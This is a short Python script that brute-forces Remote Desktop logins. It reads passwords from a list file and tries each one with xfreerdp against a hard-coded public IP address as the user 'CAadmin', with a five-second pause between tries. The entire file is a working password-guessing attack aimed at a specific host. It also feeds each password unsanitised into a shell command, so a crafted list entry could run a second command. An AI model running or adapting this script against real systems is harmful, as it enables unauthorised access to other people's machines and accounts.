import subprocess, time

ip = "34.252.140.102"
user = "CAadmin"

# Read password-list
with open('passwordlist.txt') as f:
	for line in f:
		password = line.strip()
		print('Attempting to log in with username: ' + user + ', password: ' + password)
		cmd = 'xfreerdp /cert-ignore /u:' + user + ' /p:"' + password + '" /v:' + ip + ':3389'
		#print(cmd)
		x = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
		time.sleep(5)